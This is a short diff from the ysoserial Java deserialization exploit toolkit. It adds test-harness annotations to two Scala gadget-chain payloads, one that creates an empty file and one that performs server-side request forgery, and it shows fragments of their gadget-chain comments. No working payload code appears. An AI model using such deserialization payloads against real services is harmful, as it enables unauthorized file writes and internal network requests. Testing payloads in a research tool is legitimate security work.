@@ -7,6 +7,7 @@ import scala.math.Ordering$;
 import scala.sys.process.processInternal$;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
@@ -65,6 +66,7 @@ public class Scala {
                                 scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3.apply()
                                     java.io.FileOutputStream.<init>()
      */
+    @PayloadTest(harness="ysoserial.test.payloads.EmptyFileWriteTest")
     @Dependencies({"org.scala-lang:scala-library:2.12.6"})
     @Authors({ Authors.JACKOFMOSTTRADES })
     public static class ScalaCreateZeroFile extends PayloadRunner implements ObjectPayload<PriorityQueue<Throwable>> {
@@ -88,6 +90,7 @@ public class Scala {
                                scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1.apply()
                                    java.net.URL.openStream()
     */
+    @PayloadTest(harness="ysoserial.test.payloads.SsrfTest")
     @Dependencies({"org.scala-lang:scala-library:2.12.6"})
     @Authors({ Authors.JACKOFMOSTTRADES })
     public static class ScalaSsrf extends PayloadRunner implements ObjectPayload<PriorityQueue<Throwable>> {
